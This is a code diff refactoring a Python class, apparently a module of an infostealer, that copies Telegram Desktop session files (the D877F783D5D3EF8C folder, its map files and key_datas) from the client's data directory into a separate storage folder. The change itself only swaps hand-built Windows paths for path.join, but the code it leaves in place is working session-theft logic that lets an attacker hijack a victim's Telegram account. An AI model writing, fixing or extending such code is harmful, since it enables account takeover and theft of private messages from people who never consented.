@@ -11,9 +11,7 @@ class Telegram:
     """
     def __init__(self, storage_path: str, folder: str):
 
-        self.__storage_path = storage_path
-        self.__folder = folder
-
+        self.__full_path = path.join(storage_path, folder)
         self.__config = TelegramConfig()
 
     def __create_folder(self) -> None:
@@ -21,7 +19,7 @@ class Telegram:
         Creates storage for the Telegram module.
         :return: None
         """
-        folder = rf"{self.__storage_path}\{self.__folder}\D877F783D5D3EF8C"
+        folder = path.join(self.__full_path, "D877F783D5D3EF8C")
 
         if not path.exists(folder):
             makedirs(folder)
@@ -34,7 +32,6 @@ class Telegram:
         if not path.exists(self.__config.SessionsPath):
             return
 
-        folder = rf"{self.__storage_path}\{self.__folder}"
         sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.__config.SessionsPath)], [])
 
         if not sessions:
@@ -45,14 +42,17 @@ class Telegram:
         sessions.remove("D877F783D5D3EF8C")
 
         for session in sessions:
-            copyfile(rf"{self.__config.SessionsPath}\{session}", rf"{folder}\{session}")
+            copyfile(path.join(self.__config.SessionsPath, session), path.join(self.__full_path, session))
 
-        maps = sum([findall(r"map.*", file) for file in listdir(rf"{self.__config.SessionsPath}\D877F783D5D3EF8C")], [])
+        maps = sum([findall(r"map.*", file) for file in listdir(path.join(self.__config.SessionsPath, "D877F783D5D3EF8C"))], [])
 
         for map in maps:
-            copyfile(rf"{self.__config.SessionsPath}\D877F783D5D3EF8C\{map}", rf"{folder}\D877F783D5D3EF8C\{map}")
+            copyfile(
+                path.join(self.__config.SessionsPath, "D877F783D5D3EF8C", map),
+                path.join(self.__full_path, "D877F783D5D3EF8C", map)
+            )
 
-        copyfile(rf"{self.__config.SessionsPath}\key_datas", rf"{folder}\key_datas")
+        copyfile(path.join(self.__config.SessionsPath, "key_datas"), path.join(self.__full_path, "key_datas"))
 
     def run(self) -> None:
         """
